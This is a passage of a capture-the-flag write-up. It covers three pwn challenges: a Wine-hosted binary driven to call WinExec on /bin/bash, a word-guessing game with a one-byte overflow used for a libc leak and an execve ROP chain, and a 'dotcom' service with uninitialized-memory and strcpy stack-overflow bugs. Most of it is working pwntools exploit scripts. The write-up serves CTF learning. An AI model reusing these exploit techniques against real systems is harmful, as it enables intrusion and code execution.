
io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()
print(out)
heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendline(b'msvcrt.dll')
io.sendline(b'gets')
io.sendline(str(heap_addr).encode())
io.sendline(b'/bin/bash')

io.sendline(b'msvcrt.dll')
io.sendline(b'puts')
io.sendline(str(heap_addr).encode())

io.sendline(b'msvcrt.dll')
io.sendline(b'system')

io.sendline(str(heap_addr).encode())

io.interactive()
```

But when running, it failed and returned -1, I don't know why it happened.

> If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn't found, returns 0 and sets errno to ENOENT. If command isn't NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values:

According to Microsoft's system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable `errno`.

So I leveraged the [_get_errno](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170) function to to get the current value of the errno global variable.

```python
from pwn import *

HOST = "0"
PORT = 1337
if args.LOCAL:
    io = process(["wine", "challenge.exe"])
else:
    io = remote(HOST, int(PORT))
    
io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 

io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()
heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendline(b'msvcrt.dll')
io.sendline(b'gets')
io.sendline(str(heap_addr).encode())
io.sendline(b'/bin/bash\0')

io.sendline(b'msvcrt.dll')
io.sendline(b'puts')
io.sendline(str(heap_addr).encode())

io.sendline(b'msvcrt.dll')
io.sendline(b'system')
io.sendline(str(heap_addr).encode())

sleep(1)

io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 
io.recvuntil(b'Result: ')
io.recvuntil(b'Result: ')
io.recvuntil(b'Result: ')
io.recvuntil(b'Result: ')

out = io.recvuntil(b'\r\n').strip()
print(out)
errno_ = int(out.split(b': ')[-1],16)
print(hex(errno_))

io.sendline(b'msvcrt.dll')
io.sendline(b'_get_errno')
io.sendline(str(errno_).encode())

io.sendline(b'msvcrt.dll')
io.sendline(b'puts')
io.sendline(str(errno_).encode())

print(io.recvline())

io.interactive()
```

Run this lead us know the value of errno variable is 2. 
```sh
b"Alright, we're calling it!\r\n"
b'\x02\r\n'
b'Result: 0\r\n'
b'Which module would you like to load?\r\n'
```

By referring to this [page](https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170), I see that ENOENT has a value equal to 2, so it's equivalent to the error string `the command interpreter can't be found`. 

## Solve script

`solve.py`
```python
from pwn import *

HOST = "0"
PORT = 1337
if args.LOCAL:
    io = process(["wine", "challenge.exe"])
else:
    io = remote(HOST, int(PORT))
    
io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 

io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()
print(out)
heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendline(b'msvcrt.dll')
io.sendline(b'gets')
io.sendline(str(heap_addr).encode())
io.sendline(b'/bin/bash')

io.sendline(b'kernel32.dll')
io.sendline(b'WinExec')
io.sendline(str(heap_addr).encode())

io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
```

`solve1.py` (didn't work on remote)
```python
from pwn import *

HOST = "0"
PORT = 31337
if args.LOCAL:
    io = process(["wine", "challenge.exe"])
else:
    io = remote(HOST, int(PORT))
    
io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 

io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()
heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

io.sendline(b'msvcrt.dll')
io.sendline(b'malloc')
io.sendline(str(0x100).encode()) 

io.recvuntil(b'Result: ')
out = io.recvuntil(b'\r\n').strip()

errno_ = int(out.split(b': ')[-1],16)
print(hex(errno_))

io.sendline(b'msvcrt.dll')
io.sendline(b'gets')
io.sendline(str(heap_addr).encode())
io.sendline(b'cmd.exe')

io.sendline(b'msvcrt.dll')
io.sendline(b'puts')
io.sendline(str(heap_addr).encode())

io.sendline(b'msvcrt.dll')
io.sendline(b'system')

io.sendline(str(heap_addr).encode())


io.interactive()
```

# Pwn - ndles

[Attachment]()

## Source-code overview

This challenge provides a small game, we can define the length of the solution and the number of attempts to guess.

The 2 following structs which the challenge uses to handle the game.

`game_t` struct
```c
struct game_t
{
  uint8_t guess_cnt;
  struct guess_t guess[8];
  struct guess_t sol;
};
```

`guess_t` struct
```c
struct guess_t
{
  uint8_t letter_cnt;
  char letters[9];
};
```

## Bug

```c
 if ( sol_length <= 10u )
  {
    if ( guess_cnt <= 8u )
    {
      game.guess_cnt = guess_cnt;
      game.sol.letter_cnt = sol_length;
      for ( i = 0; i < game.sol.letter_cnt; ++i )
        game.sol.letters[i] = 0;
      for ( j = 0; j < game.guess_cnt; ++j )
      {
        game.guess[j].letter_cnt = game.sol.letter_cnt;
        for ( k = 0; k < game.guess[j].letter_cnt; ++k )
          *(&savedregs + 10 * j + k - 142) = 0;
      }
      if ( game.sol.letter_cnt )
        game.sol.letters[0] = 'r';
      if ( game.sol.letter_cnt > 1u )
        game.sol.letters[1] = 'e';
      if ( game.sol.letter_cnt > 2u )
        game.sol.letters[2] = 'v';
      if ( game.sol.letter_cnt > 3u )
        game.sol.letters[3] = 'e';
      if ( game.sol.letter_cnt > 4u )
        game.sol.letters[4] = 'r';
      if ( game.sol.letter_cnt > 5u )
        game.sol.letters[5] = 's';
      if ( game.sol.letter_cnt > 6u )
        game.sol.letters[6] = 'e';
      if ( game.sol.letter_cnt > 7u )
        game.sol.letters[7] = 'r';
      if ( game.sol.letter_cnt > 8u )
        game.sol.letters[8] = 's';
      v13 = 0;
      for ( m = 0; m < game.guess_cnt; ++m )
      {
        printf("What is your guess #%d?\n", (unsigned int)(m + 1));
        for ( n = 0; n < game.guess[m].letter_cnt; ++n )
        {
          do
            v10 = getchar();
          while ( ((*__ctype_b_loc())[(char)v10] & 0x2000) != 0 );
          *(&savedregs + 10 * m + n - 142) = v10;
        }
        for ( ii = 0; ii <= m; ++ii )
          print_guess(&game.guess[ii], &game.sol);
        v8 = 1;
        for ( jj = 0; jj < game.sol.letter_cnt; ++jj )
        {
          if ( *(&savedregs + 10 * m + jj - 142) != game.sol.letters[jj] )
          {
            v8 = 0;
            break;
          }
        }
        if ( v8 )
        {
          v13 = 1;
          break;
        }
      }
      if ( v13 )
        puts("That's the correct word! You win!");
      else
        puts("You couldn't guess the word! You lose!");
      return 0;
    }
    else
    {
      puts("Guess count too long!");
      return 1;
    }
  }
  else
  {
    puts("Solution length too long!");
    return 1;
  }
}
```

The only bug I founded in this main function is the one-byte overflow to the next struct because it's allows us to define up to 10 of solution length =))

So, I leveraged this to leak and did a basic BufferOverFlow.

## Solve script

```python
from pwn import *

HOST = ""
PORT = 0
if args.LOCAL:
    io = process("./challenge_patched")
    if args.GDB:
        cmd = """"
        """
        gdb.attach(io, cmd)
else:
    io = remote(HOST, PORT)

libc = ELF("./libc.so.6")

io.sendlineafter(b' be?\n', b'10')
io.sendlineafter(b' get?\n', b'7')


io.sendlineafter(b'What is your guess #1?\n', b'123456789\xff')

pay = b'A' * 9 + b'\xff' + b'A' * (0x6c-10) + b'\xff'
pause()
io.sendlineafter(b'What is your guess #2?\n', pay)

leak = io.recvuntil(b'What is your guess #3?\n')

leak = leak.replace(b"\x1b[1;30;42m ", b"").replace(b"\x1b[1;30;43m ", b"").replace(b"\x1b[0m ", b"")
leak = leak.replace(b" ", b"")

libc.address = u64(leak[0x9b:0x9b+8]) - 0x29d90
log.info("libc "+hex(libc.address))

pay = b'\0' * (0x6c-10) + b"\x81" 
pay += p64(libc.address+0x000000000002a3e5) + p64(next(libc.search(b'/bin/sh'))) 
pay += p64(libc.address+0x000000000002be51) + p64(0)
pay += p64(libc.address+0x000000000011f2e7) + p64(0)*2
pay += p64(libc.sym.execve)
io.sendline(pay.ljust(255, b'\0'))

io.sendline(b'./submitter')

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
```


# Pwn - dotcom

[Attachment]()

## Source-code overview

```shell
╭─[nvm] as kyrie in ~/CTF/2024/defcon/dotcom                                                                                                                                  00:41:22
╰──➤ tree .
.
├── airbag
├── bailout
├── Dockerfile
├── dotcom_market
├── libc.so.6
├── packages.txt
├── run_on_socket.sh
├── seccomp.txt
└── start.sh
```

This challenge looks like the typical notes challenge,  but there is a strong seccomp filter.


It begins with installing some crash handlers and also opens the flag file. So, if we can control the flow, we can easily read the flag file.

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  feenableexcept(13);
  install_crash_handler(11);
  install_crash_handler(6);
  install_crash_handler(5);
  install_crash_handler(8);
  install_crash_handler(4);
  install_crash_handler(7);
  install_crash_handler(2);
  open("/flag1.txt", 0);
  set_permissions();
  create_new_graph();
}
```

## Vulnerabilities

### Uninitialized Memory

```c    
  m = (market_model_0 *)malloc(end - p + 49);
  has_any = 0;
  if ( !isNaN(values[0]) )
  {
    has_any = 1;
    m->supply = values[0];
  }
  if ( !isNaN(values[1]) )
  {
    has_any = 1;
    m->demand = values[1];
  }
  if ( !isNaN(values[2]) )
  {
    has_any = 1;
    m->income = 64.0 * values[2];
  }
  if ( !isNaN(values[3]) )
  {
    has_any = 1;
    m->employment = 64.0 * values[3];
  }
  if ( !isNaN(values[4]) )
  {
    has_any = 1;
    m->confidence = 64.0 * values[4];
  }
  if ( !has_any )
  {
    puts("Error! Invalid model format, all values are NAN");
    abort();
  }
  memcpy(m->notes, p, note_len);
  m->notes[note_len] = 0;
  for ( i = 0LL; i < 0x20; ++i )
  {
    if ( !model_list[i] )
    {
      model_list[i] = m;
      printf("Loaded model #%02lu... \x1B[30;40m@%p\x1B[0m\n", i, m);
      return m;
    }
  }
```

Since the value doesn't overwrite when they are NaN and because after malloc, the memory isn't properly initialized. So we can leverage that to have a strong leak through the `draw_graph` function.

### Stack overflow

```c
char *__cdecl find_abort_string(uint64_t rsp_0)
{
  int i; // [rsp+14h] [rbp-3Ch]
  uint64_t *p; // [rsp+18h] [rbp-38h]
  char format[32]; // [rsp+20h] [rbp-30h] BYREF
  uint64_t rsp_0a; // [rsp+40h] [rbp-10h]

  rsp_0a = rsp_0;
  memset(format, 0, sizeof(format));
  p = (uint64_t *)rsp_0a;
  for ( i = 0; i < 500; ++i )
  {
    if ( *p == 'essA :)(' )
    {
      strcpy(format, (const char *)p);
      return strdup(format);
    }
    ++p;
  }
  return 0LL;
}
```

In the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the `strcpy` function.

Since strcpy terminates when it encounters a null byte, we can't perform a rop chain, so I will choose the following gadget to cause stack overflow again. Fortunately, the stack address remains in the RDI register.
```c
.text:00000000004025A1                 mov     rax, cs:stdin_ptr
.text:00000000004025A8                 mov     rdx, [rax]      ; stream
.text:00000000004025AB                 mov     esi, 0C8h       ; n
.text:00000000004025B0                 call    _fgets
```


## Trigger the bug

First, I created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin

```shell
pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
all: 0xca62a0 —▸ 0x791d8281ace0 (main_arena+96) ◂— 0xca62a0
smallbins
empty
largebins
empty
```

So basically, allocate again and select the module 1 to leak our libc address

```python
from pwn import *

context.log_level = 'debug'

if args.LOCAL:
    io = process(['./dotcom_market'])
    if args.GDB:
        cmd = """
        b* free
        """
        gdb.attach(io, cmd)
else:
    io = remote("dotcom.shellweplayaga.me", 10001)

elf = ELF("./dotcom_market")
libc = ELF("./libc.so.6")

def import_module(model):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'| ', model)    
    
def trasting(idx):
    io.sendlineafter(b'> ', b'66')
    io.sendlineafter(b'> ', str(idx).encode())

io.sendlineafter(b'| ', b'aaaa')

model = b'0|0|0|0|0|'+b'A'*0x400
import_module(str(len(model)).encode()+b'|'+model)
import_module(str(len(model)).encode()+b'|'+model)

trasting(1)

NaN = struct.unpack("Q", struct.pack("d", float('nan')))[0]
print(hex(NaN))

model = str(NaN).encode() + b'|0|0|0|0|' + b'A'*0x400

import_module(str(len(model)).encode()+b'|'+model)

io.sendlineafter(b'> ', b'1')
io.recvuntil(b'r = ')

supply = 0x0BFA999999999999A
leak = float(io.recvuntil(b" ", drop=True).decode())
packed_value = struct.pack('Q', supply)
supply_coefficient = struct.unpack('d', packed_value)[0]

libc.address = u64(struct.pack("d", leak / supply_coefficient)) & ~0xfff - 0x21a000
log.info("libc " + hex(libc.address))

io.interactive()
```


## Solve script

```python
from pwn import *

#context.log_level = 'debug'

if args.LOCAL:
    io = process(['./dotcom_market'])
    if args.GDB:
        cmd = """
        b* crash_handler
        """
        gdb.attach(io, cmd)
else:
    io = remote("dotcom.shellweplayaga.me", 10001)

elf = context.binary = ELF("./dotcom_market")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def import_module(model):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'| ', model)    
    
def trasting(idx):
    io.sendlineafter(b'> ', b'66')
    io.sendlineafter(b'> ', str(idx).encode())

io.sendlineafter(b'| ', b'aaaa')

model = b'0|0|0|0|0|'+b'A'*0x400
import_module(str(len(model)).encode()+b'|'+model)
import_module(str(len(model)).encode()+b'|'+model)

trasting(1)

NaN = struct.unpack("Q", struct.pack("d", float('nan')))[0]
print(hex(NaN))

model = str(NaN).encode() + b'|0|0|0|0|' + b'A'*0x400

import_module(str(len(model)).encode()+b'|'+model)

io.sendlineafter(b'> ', b'1')
io.recvuntil(b'r = ')

leak = float(io.recvuntil(b" ", drop=True).decode())
libc.address = u64(struct.pack("d", leak * (-20))) & ~0xfff - 0x21a000

log.info("libc " + hex(libc.address))

io.sendlineafter(b'> ', b'1')

pl = b'1280|'
pl += p64(0x65737341203A2928) // magic
pl += b'A'*0x30
pl += p64(0x4025A1)
pl += b'X'*(1284 - len(pl))

import_module(pl)

rop = ROP(libc)
rop.read(3, libc.bss(), 0x100)
rop.write(1, libc.bss(), 0x100)
pl = 24*b'A'
pl += bytes(rop)

io.sendline(pl)
io.interactive()
```

# References

[https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170)

[https://schlafwandler.github.io/posts/attacking-wine-part-i/](https://schlafwandler.github.io/posts/attacking-wine-part-i/)

[https://github.com/Nautilus-Institute/quals-2024/tree/main](https://github.com/Nautilus-Institute/quals-2024/tree/main)

[https://www.pcre.org/](https://www.pcre.org/)

[https://github.com/PCRE2Project/pcre2](https://github.com/PCRE2Project/pcre2)

[https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine](https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine)

[https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170)

[https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170](https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170)
